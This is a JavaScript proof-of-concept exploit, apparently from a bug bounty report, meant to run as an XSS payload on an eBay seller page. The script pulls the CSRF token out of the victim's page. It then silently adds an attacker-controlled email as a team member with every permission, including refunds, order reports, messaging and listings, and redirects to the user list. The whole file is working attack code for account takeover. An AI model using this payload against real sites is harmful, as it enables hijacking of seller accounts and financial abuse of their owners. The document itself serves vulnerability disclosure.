// XSS PoC - Add Team Member (with duplicate execution prevention)
(async function() {
    // Prevent duplicate execution
    if (window.__pocExecuted) return;
    window.__pocExecuted = true;
    
    const attackerEmail = "naysser+845@bugcrowdninja.com";
    const firstName = "LEOS";
    const lastName = "SECOND";
    
    try {
        // Fetch page to extract CSRF token
        const response = await fetch('/teamxs/member/add-member', {
            method: 'GET',
            credentials: 'include'
        });
        
        const html = await response.text();
        
        // Extract SRT token
        const srtMatch = html.match(/"srt"\s*:\s*"([a-f0-9]+)"/);
        
        if (!srtMatch || !srtMatch[1]) {
            alert('PoC Failed - Could not extract CSRF token');
            return;
        }
        
        const srtToken = srtMatch[1];
        
        // Payload
        const payload = {
            permissionList: [
                { permissionId: "5000000002", permissionName: "Publish and revise listings", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000001", permissionName: "Create and edit drafts", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000009", permissionName: "Manage refunds, requests and disputes", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000006", permissionName: "Download order report", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000008", permissionName: "Print shipping labels", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000007", permissionName: "Add shipping tracking", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000005", permissionName: "View orders", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000012", permissionName: "Manage member to member messages", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000010", permissionName: "Create and manage discounts, buyer groups", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000011", permissionName: "Create and manage advertising campaigns", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000004", permissionName: "Research products using Terapeak", permissionNameSpace: "PERMISSION" }
            ],
            firstName: firstName,
            lastName: lastName,
            email: attackerEmail,
            message: "good"
        };
        
        // Single POST request
        const addMemberResponse = await fetch(`/teamxs/member/add-member?srt=${srtToken}`, {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*'
            },
            body: JSON.stringify(payload)
        });
        
        // Show success and redirect (don't wait for response validation)
        alert('✅ PoC Succeeded by Naysser!\n\nTeam member added with full permissions.\nRedirecting to user list...');
        window.location.href = 'https://www.ebay.com/sh/acct/userlist';
        
    } catch (error) {
        alert('PoC Error: ' + error.message);
    }
})();
